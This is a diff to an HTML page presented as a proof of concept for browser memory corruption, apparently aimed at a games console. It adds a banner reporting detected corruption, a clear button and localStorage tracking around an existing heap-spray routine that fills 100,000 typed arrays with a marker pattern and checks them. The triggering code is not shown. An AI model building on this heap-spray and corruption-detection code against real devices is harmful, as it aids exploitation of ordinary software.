@@ -129,22 +129,46 @@ body {
   box-shadow: 0 0 30px rgba(0,0,0,0.7);
   display: none;
 }
-</style>
+#corruption-status {
+  position: absolute;
+  top: 20px;
+  left: 50%;
+  transform: translateX(-50%);
+  background: #000;
+  color: #0f0;
+  font-size: 20px;
+  font-family: monospace;
+  border: 2px solid #0f0;
+  padding: 10px 20px;
+  border-radius: 10px;
+  z-index: 50;
+  display: none;
+}
+
+#clear-button {
+  position: fixed;
+  bottom: 20px;
+  left: 20px;
+  background: #111;
+  color: #fff;
+  font-family: monospace;
+  font-size: 16px;
+  padding: 6px 12px;
+  border: 1px solid #0f0;
+  border-radius: 8px;
+  cursor: pointer;
+  z-index: 50;
+  display: none;
+}</style>
 </head>
 <body>
 <div id="systemMonitorButton" onclick="runPoC()">
-  <div class="hex">
-    <div></div><div></div><div></div>
-  </div>
-  <div class="hex">
-    <div></div><div></div><div></div>
-  </div>
+  <div class="hex"><div></div><div></div><div></div></div>
+  <div class="hex"><div></div><div></div><div></div></div>
 </div>
 
 <span id="go-text">GO!</span>
-
 <div id="message">Click to launch the PoC</div>
-
 <div id="popup">
   <div style="font-family: monospace; font-size: 50px; text-align: center;">
     Press the OPTIONS button<br>
@@ -156,6 +180,9 @@ body {
   </div>
 </div>
 
+<div id="corruption-status">✔ Memory corruption detected!</div>
+<button id="clear-button" onclick="clearCorruptionStatus()">Clear corruption status</button>
+
 <script>
 function runPoC() {
   document.getElementById("message").textContent =
@@ -166,6 +193,7 @@ function runPoC() {
     const PATTERN   = 0x43434343;
     const SPRAY_CNT = 100000;
     const SPRAY_LEN = 16;
+    let corruptionFound = false;
 
     const spray=[];
     for(let i=0;i<SPRAY_CNT;i++){
@@ -188,18 +216,47 @@ function runPoC() {
       const u=spray[i].u32;
       for(let j=0;j<u.length;j++){
         if(u[j]!==PATTERN){
+          corruptionFound = true;
           break;
         }
       }
+      if (corruptionFound) break;
     }
 
-    
+    // Mostrar resultado y guardar en localStorage
+    if (corruptionFound) {
+      document.getElementById("corruption-status").style.display = "block";
+      localStorage.setItem("corruptionDetected", "true");
+    } else {
+      localStorage.setItem("corruptionDetected", "false");
+    }
+
     document.getElementById("popup").style.display = "block";
+    checkStoredStatus();
 
   }).catch(err => {
     document.getElementById("message").textContent = "Error: " + err.message;
   });
 }
+
+function checkStoredStatus() {
+  const status = localStorage.getItem("corruptionDetected");
+  if (status === "true") {
+    document.getElementById("corruption-status").style.display = "block";
+    document.getElementById("clear-button").style.display = "inline-block";
+  } else if (status === "false") {
+    document.getElementById("corruption-status").style.display = "none";
+    document.getElementById("clear-button").style.display = "inline-block";
+  }
+}
+
+function clearCorruptionStatus() {
+  localStorage.removeItem("corruptionDetected");
+  document.getElementById("corruption-status").style.display = "none";
+  document.getElementById("clear-button").style.display = "none";
+}
+
+window.onload = checkStoredStatus;
 </script>
 </body>
 </html>
